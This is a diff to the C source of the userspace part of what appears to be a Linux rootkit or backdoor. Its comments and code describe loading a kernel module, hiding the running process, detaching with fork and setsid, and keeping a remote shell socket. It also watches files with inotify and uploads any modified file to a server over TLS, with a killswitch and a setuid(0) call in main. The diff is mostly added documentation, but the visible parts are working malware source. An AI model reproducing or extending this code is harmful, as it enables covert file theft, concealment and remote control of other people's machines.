@@ -1,6 +1,6 @@
 /*
  * Author and Designer: John Agapeyev
- * Date: 2018-10-19
+ * Date: 2018-11-30
  * Notes:
  * The socket handling for userspace
  */
@@ -59,6 +59,8 @@
 #define DEBUG_PERROR(str) ((void)0)
 #endif
 
+#define finit_module(fd, param_values, flags) syscall(__NR_finit_module, fd, param_values, flags)
+
 struct inot_watch {
     int wd;
     char name[NAME_MAX + 1];
@@ -70,15 +72,12 @@ int conn_sock = -1;
 int remote_shell_sock = -1;
 int local_socks[2];
 
-//int inot_fd = -1;
 int* inot_fd;
 int inot_epoll = -1;
 struct inot_watch* inot_wds;
 size_t* inot_watch_count;
 
 extern char **environ;
-
-#define finit_module(fd, param_values, flags) syscall(__NR_finit_module, fd, param_values, flags)
 
 /*
  * function:
@@ -102,6 +101,19 @@ pid_t wrapped_fork(void) {
     return pid;
 }
 
+/*
+ * function:
+ *    wrapped_mmap
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    size_t size
+ *
+ * notes:
+ * Creates an anonymous shared mapping for shared memory IPC
+ */
 void* wrapped_mmap(size_t size) {
     void* out = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 
@@ -112,6 +124,19 @@ void* wrapped_mmap(size_t size) {
     return out;
 }
 
+/*
+ * function:
+ *    hide_proc
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    void
+ *
+ * notes:
+ * Sends a message to the kernel module to hide the current process on its kill list
+ */
 void hide_proc(void) {
     unsigned char buf[30];
     memset(buf, 0, 30);
@@ -293,6 +318,16 @@ int wait_for_epoll_event(const int epollfd, struct epoll_event* events) {
     return nevents;
 }
 
+/*
+ * function:
+ *    create_inotify_descriptor
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    void
+ */
 int create_inotify_descriptor(void) {
     int fd = inotify_init1(IN_CLOEXEC);
     if (fd < 0) {
@@ -302,6 +337,19 @@ int create_inotify_descriptor(void) {
     return fd;
 }
 
+/*
+ * function:
+ *    promote_child
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    void
+ *
+ * notes:
+ * Wraps fork and setsid
+ */
 void promote_child(void) {
     if (wrapped_fork()) {
         exit(EXIT_SUCCESS);
@@ -309,6 +357,20 @@ void promote_child(void) {
     setsid();
 }
 
+/*
+ * function:
+ *    add_read_socket_epoll
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    int efd
+ *    int sock
+ *
+ * notes:
+ * Adds a socket to an epoll descriptor
+ */
 void add_read_socket_epoll(int efd, int sock) {
     struct epoll_event ev;
     ev.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
@@ -316,6 +378,20 @@ void add_read_socket_epoll(int efd, int sock) {
     add_epoll_socket(efd, sock, &ev);
 }
 
+/*
+ * function:
+ *    epoll_event_loop
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    SSL *ssl
+ *
+ * notes:
+ * Reads from multiple sockets that want to send data over the server
+ * This also has a special case for handling the killswitch
+ */
 void epoll_event_loop(SSL* ssl) {
     int efd = create_epoll_fd();
     struct epoll_event* eventList = calloc(100, sizeof(struct epoll_event));
@@ -370,6 +446,19 @@ done:
     free(eventList);
 }
 
+/*
+ * function:
+ *    handle_inotify_create
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    struct inotify_event *ie
+ *
+ * notes:
+ * Adds a newly created file in a watched directory to inotify
+ */
 void handle_inotify_create(struct inotify_event* ie) {
     DEBUG_PRINT("%s was created\n", ie->name);
     int wd;
@@ -383,6 +472,19 @@ void handle_inotify_create(struct inotify_event* ie) {
     ++(*inot_watch_count);
 }
 
+/*
+ * function:
+ *    handle_inotify_ignore
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    struct inotify_event *ie
+ *
+ * notes:
+ * Removes and readds the inotify watch in the event of a vim-style edit
+ */
 void handle_inotify_ignore(struct inotify_event* ie) {
     for (size_t j = 0; j < *inot_watch_count; ++j) {
         if (inot_wds[j].wd == ie->wd) {
@@ -401,6 +503,19 @@ void handle_inotify_ignore(struct inotify_event* ie) {
     }
 }
 
+/*
+ * function:
+ *    handle_inotify_modified
+ *
+ * return:
+ *    int
+ *
+ * parameters:
+ *    struct inotify_event *ie
+ *
+ * notes:
+ * Reads the modified file, and uploads it to the server
+ */
 int handle_inotify_modified(struct inotify_event* ie) {
     //DEBUG_PRINT("%s was modified\n", ie->name);
     const char* file_name = NULL;
@@ -447,6 +562,19 @@ int handle_inotify_modified(struct inotify_event* ie) {
     return 0;
 }
 
+/*
+ * function:
+ *    unwatch_inotify
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    void
+ *
+ * notes:
+ * Removes all active watches from inotify
+ */
 void unwatch_inotify(void) {
     //Unregister all inotify handles here
     for (size_t i = 0; i < *inot_watch_count; ++i) {
@@ -456,6 +584,19 @@ void unwatch_inotify(void) {
     *inot_watch_count = 0;
 }
 
+/*
+ * function:
+ *    inotify_event_loop
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    void
+ *
+ * notes:
+ * Reads events from inotify, and handles the event accordingly
+ */
 void inotify_event_loop(void) {
     unsigned char buf[(sizeof(struct inotify_event) + NAME_MAX + 1) * 8192];
     struct inotify_event* ie = (struct inotify_event*) buf;
@@ -494,6 +635,19 @@ void inotify_event_loop(void) {
     }
 }
 
+/*
+ * function:
+ *    ssl_read_event_loop
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    SSL *ssl
+ *
+ * notes:
+ * Reads from the server, and handles the message appropriately
+ */
 void ssl_read_event_loop(SSL* ssl) {
     //Read
     for (;;) {
@@ -553,7 +707,7 @@ void ssl_read_event_loop(SSL* ssl) {
  *    char** argv
  *
  * notes:
- * Establishes a TLS session, forks into read and write processes, and forwards packets
+ * Establishes a TLS session, forks into read, write, inotify, and shell processes, and forwards packets to the kernel/server
  */
 int main(void) {
     if (setuid(0)) {
